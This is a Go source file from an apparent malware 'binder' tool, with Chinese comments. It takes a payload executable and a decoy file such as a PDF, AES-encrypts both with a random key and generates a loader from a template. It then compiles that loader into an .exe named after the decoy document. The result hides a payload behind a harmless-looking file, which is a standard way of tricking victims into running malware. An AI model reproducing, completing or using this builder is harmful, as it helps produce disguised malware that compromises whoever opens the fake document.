package binder

import (
	"os"
	"path/filepath"
	"strings"

	"github.com/derian/binder/pkg/encode"
	"github.com/derian/binder/pkg/util"
	"github.com/zan8in/gologger"
)

func Run(options *Options) error {
	payloadFileName := options.Payload // EnumFontsW4188d.exe
	fileName := options.File           // 测试.pdf
	// 1.判断文件是否存在
	exists, err := util.FileExists(payloadFileName)
	if !exists {
		return err
	}
	exists1, err := util.FileExists(fileName)
	if !exists1 {
		return err
	}
	// 2.读取文件内容
	payloadByteData, err := os.ReadFile(payloadFileName)
	if err != nil {
		gologger.Error().Msgf("读取payload文件失败: %v", err)
		return err
	}
	fileByteData, err := os.ReadFile(fileName)
	if err != nil {
		gologger.Error().Msgf("读取文件失败: %v", err)
		return err
	}
	// 3.使用AES加密
	randomKey, err := util.GenerateRandomString(32)
	if err != nil {
		gologger.Error().Msgf("生成随机密钥失败: %v", err)
		return err
	}
	encryptPayload, err := encode.AesEncrypt(payloadByteData, []byte(randomKey))
	if err != nil {
		gologger.Error().Msgf("文件 %s AES加密失败\n", payloadFileName)
		return err
	}
	gologger.Info().Msgf("文件 %s AES加密成功\n", payloadFileName)
	encryptFile, err := encode.AesEncrypt(fileByteData, []byte(randomKey))
	if err != nil {
		gologger.Error().Msgf("文件 %s AES加密失败\n", fileName)
		return err
	}
	gologger.Info().Msgf("文件 %s AES加密成功\n", fileName)
	// 4.保存exe文件的路径
	resultDir := options.Output // 默认 result目录
	isExit, err := util.FileExists(resultDir)
	if err != nil && !os.IsNotExist(err) {
		gologger.Error().Msgf("检查输出目录失败: %v", err)
		return err
	}
	if !isExit {
		if err := os.MkdirAll(resultDir, 0755); err != nil {
			gologger.Error().Msgf("创建输出目录失败: %v", err)
			return err
		}
	}

	// 5.清理旧的Go文件以避免编译冲突
	if err := util.CleanupOldGoFiles(resultDir); err != nil {
		gologger.Warning().Msgf("清理旧文件失败: %v", err)
		// 不阻止程序继续执行
	}
	// 6.替换到模板中,生成最终的go文件(捆绑了两个文件的源文件)
	params := util.GenGoFileParams{
		LoaderName:     "demo1",
		FileName:       fileName,
		RandomKey:      randomKey,
		EncryptPayload: encryptPayload,
		EncryptFile:    encryptFile,
		ResultDir:      resultDir,
	}
	goFileName, err := util.GenGoFile(params)
	if err != nil {
		gologger.Error().Msgf("生成Go文件失败: %v", err)
		return err
	}

	// 5.编译go文件
	// goFileName result\a8f6773c99.go
	baseFileName := filepath.Base(fileName) // 获取文件名部分，去掉路径
	parts := strings.Split(baseFileName, ".")
	name := parts[0] + ".exe"
	exeFilePath := filepath.Join(resultDir, name)
	if err := util.BuildLoaderFile(goFileName, exeFilePath); err != nil {
		return err
	}
	// 6.删除go文件
	//os.Remove(goFileName)
	return nil
}
